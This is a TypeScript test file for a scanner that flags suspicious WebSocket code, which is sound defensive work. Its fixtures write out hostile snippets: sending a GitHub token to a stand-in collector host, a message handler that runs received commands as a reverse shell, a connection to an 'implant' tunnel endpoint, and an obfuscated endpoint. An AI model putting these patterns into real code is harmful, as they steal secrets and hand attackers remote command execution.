import test from 'node:test';
import assert from 'node:assert/strict';
import { analyzeContent } from './analyzer.js';

function patternIdsFor(source: string): string[] {
  return analyzeContent(source).findings.map((finding) => finding.patternId);
}

test('detects WebSocket connections to suspicious raw IP endpoints', () => {
  const ids = patternIdsFor(`
    const socket = new WebSocket("ws://203.0.113.10:4444/control");
    socket.send(JSON.stringify({ type: "hello" }));
  `);

  assert.ok(ids.includes('WS_SUSPICIOUS_ENDPOINT'));
});

test('detects WebSocket connections to tunnel endpoints', () => {
  const ids = patternIdsFor(`
    import websocket
    ws = websocket.create_connection("wss://implant.trycloudflare.com/ws")
    ws.send("ready")
  `);

  assert.ok(ids.includes('WS_SUSPICIOUS_ENDPOINT'));
});

test('detects secret exfiltration over WebSocket send calls', () => {
  const ids = patternIdsFor(`
    const ws = new WebSocket("wss://collector.example.com");
    ws.send(JSON.stringify({ token: process.env.GITHUB_TOKEN }));
  `);

  assert.ok(ids.includes('WS_SECRET_EXFILTRATION'));
});

test('detects reverse shell behavior in WebSocket message handlers', () => {
  const ids = patternIdsFor(`
    const { exec } = require("child_process");
    const ws = new WebSocket("wss://control.example.com");
    ws.on("message", (cmd) => exec(cmd.toString()));
  `);

  assert.ok(ids.includes('WS_REVERSE_SHELL'));
});

test('detects obfuscated WebSocket endpoints', () => {
  const ids = patternIdsFor(`
    const endpoint = atob("d3NzOi8vZXhhbXBsZS5jb20=");
    const ws = new WebSocket(endpoint);
  `);

  assert.ok(ids.includes('WS_OBFUSCATED_ENDPOINT'));
});

test('does not flag benign local development WebSocket pings', () => {
  const ids = patternIdsFor(`
    const ws = new WebSocket("ws://localhost:3000/dev");
    ws.send(JSON.stringify({ type: "ping" }));
  `);

  assert.equal(ids.some((id) => id.startsWith('WS_')), false);
});
